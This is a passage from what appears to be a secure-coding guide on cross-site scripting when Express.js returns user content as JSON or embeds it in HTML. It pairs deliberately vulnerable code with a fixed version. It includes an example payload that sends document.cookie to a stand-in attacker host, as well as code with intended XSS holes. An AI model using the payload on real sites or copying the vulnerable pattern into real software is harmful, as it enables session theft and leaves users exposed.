**Additional Protections**:
- **CSP Report-Only Mode for Testing**: Deploy with `Content-Security-Policy-Report-Only` header first to identify violations without breaking functionality
- **Subresource Integrity (SRI)**: Add integrity hashes to all third-party scripts: `<script src="..." integrity="sha384-..." crossorigin="anonymous">`
- **Feature Policy/Permissions Policy**: Disable dangerous browser features: `Permissions-Policy: geolocation=(), microphone=(), camera=()`
- **Strict Transport Security**: Enforce HTTPS with `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
- **Regular CSP Auditing**: Use tools like Google's CSP Evaluator to identify weaknesses in your policy

Returning user-generated content in JSON responses requires careful handling because JSON can be exploited for XSS in several contexts - when embedded in HTML, when content-type sniffing occurs, or when the JSON is used client-side without proper escaping.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const app = express();

app.use(express.json());

// Vulnerable: User data directly embedded in JSON response
app.get('/api/user/:id', async (req, res) => {
  const userId = req.params.id;

  // Simulated database fetch
  const user = await db.query('SELECT * FROM users WHERE id = ?', [userId]);

  // DANGEROUS: User-controlled data sent without sanitization
  res.json({
    id: user.id,
    username: user.username,
    bio: user.bio,           // User-controlled - could contain malicious content
    website: user.website,   // User-controlled URL
    avatar: user.avatar      // User-controlled URL
  });
});

// Vulnerable: JSON embedded directly in HTML template
app.get('/user/:id', async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);

  // DANGEROUS: JSON embedded in script tag without escaping
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>User Profile</title></head>
    <body>
      <div id="profile"></div>
      <script>
        const userData = ${JSON.stringify(user)};
        document.getElementById('profile').innerHTML = userData.bio;
      </script>
    </body>
    </html>
  `);
});
```

**Attack Payload**:
```html
<!-- Bio field containing XSS payload -->
</script><script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script><script>

<!-- Or using JSON-breaking characters -->
{"bio": "</script><img src=x onerror=alert(document.domain)>"}
```

**Why This Is Dangerous**:
- JSON.stringify() does not escape HTML-significant characters like `</script>`
- When JSON is embedded in HTML `<script>` tags, attackers can break out of the JSON context
- Using innerHTML with user data creates DOM-based XSS
- Missing Content-Type headers allow browser content sniffing

**SECURE VERSION**:

```javascript
const express = require('express');
const helmet = require('helmet');
const DOMPurify = require('isomorphic-dompurify');
const validator = require('validator');

const app = express();

// Security headers to prevent content-type sniffing
app.use(helmet());
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"]
  }
}));

app.use(express.json());

// Utility: Escape characters dangerous in JSON-in-HTML contexts
function escapeJsonForHtml(obj) {
  const jsonString = JSON.stringify(obj);
  // Escape characters that could break out of script context
  return jsonString
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(/'/g, '\\u0027')
    .replace(/"/g, '\\u0022');
}

// Utility: Sanitize user-generated content
function sanitizeUserData(user) {
  return {
    id: parseInt(user.id, 10),
    username: validator.escape(user.username || ''),
    bio: DOMPurify.sanitize(user.bio || '', { ALLOWED_TAGS: [] }), // Strip all HTML
    website: validator.isURL(user.website || '') ? user.website : null,
    avatar: validator.isURL(user.avatar || '') ? user.avatar : '/default-avatar.png'
  };
}

// SECURE: API endpoint with proper headers and sanitization
app.get('/api/user/:id', async (req, res) => {
  const userId = parseInt(req.params.id, 10);

  if (isNaN(userId) || userId <= 0) {
    return res.status(400).json({ error: 'Invalid user ID' });
  }

  const user = await db.query('SELECT * FROM users WHERE id = ?', [userId]);

  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  // Explicit content-type prevents sniffing
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // Sanitize before sending
  const safeUser = sanitizeUserData(user);
  res.json(safeUser);
});
